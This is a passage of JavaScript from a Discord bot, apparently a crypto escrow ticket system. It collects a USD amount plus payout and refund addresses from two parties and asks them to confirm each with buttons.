        new ButtonBuilder().setCustomId('role_reset').setLabel('Reset').setStyle(ButtonStyle.Danger)
      );

      await message.channel.send({ embeds: [roleEmbed], components: [row] });
    }
  }

  else if (ticketData.status === 'awaiting_amount' && message.author.id === ticketData.roles.sender) {
    const val = parseFloat(message.content);
    if (!isNaN(val) && val > 0) {
      ticketData.amountUSD = val;
      ticketData.status = 'confirming_amount';

      const amountConfirmEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Amount Confirmation')
        .setDescription(`Confirm that the bot is expected to process the following exact USD value\n\nAmount\n$${val.toFixed(2)}\n\n**Both users must click Correct to proceed.**`);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('amount_confirm_correct').setLabel('Correct').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('amount_confirm_incorrect').setLabel('Incorrect').setStyle(ButtonStyle.Secondary)
      );

      await message.channel.send({ embeds: [amountConfirmEmbed], components: [row] });
    }
  }

  else if (ticketData.status === 'awaiting_receiver_address' && message.author.id === ticketData.roles.receiver) {
    const address = message.content.trim();
    if (address.length > 5) {
      ticketData.receiverCryptoAddress = address;
      ticketData.status = 'confirming_receiver_address';

      const verifyAddressEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle(`Is this your correct payout address?`)
        .setDescription(`Please carefully verify that the address provided below is accurate. Once execution completes, cryptocurrency funds cannot be recovered if sent incorrectly.\n\nAddress\n${address}`);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('address_confirm_yes').setLabel('Confirm').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('address_confirm_no').setLabel('Back').setStyle(ButtonStyle.Secondary)
      );

      await message.channel.send({ embeds: [verifyAddressEmbed], components: [row] });
    }
  }

  else if (ticketData.status === 'awaiting_sender_refund_address' && message.author.id === ticketData.roles.sender) {
    const address = message.content.trim();
    if (address.length > 5) {
      ticketData.senderRefundAddress = address;
      ticketData.status = 'confirming_refund_address';

      const verifyRefundAddressEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle(`Is this your refund address?`)
        .setDescription(`Please verify your refund address below. Once confirmed, funds will be returned to you.\n\nAddress\n${address}`);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('refund_address_confirm_yes').setLabel('Confirm').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('refund_address_confirm_no').setLabel('Back').setStyle(ButtonStyle.Secondary)
      );

      await message.channel.send({ embeds: [verifyRefundAddressEmbed], components: [row] });
    }
  }
});

client.login(process.env.DISCORD_TOKEN);
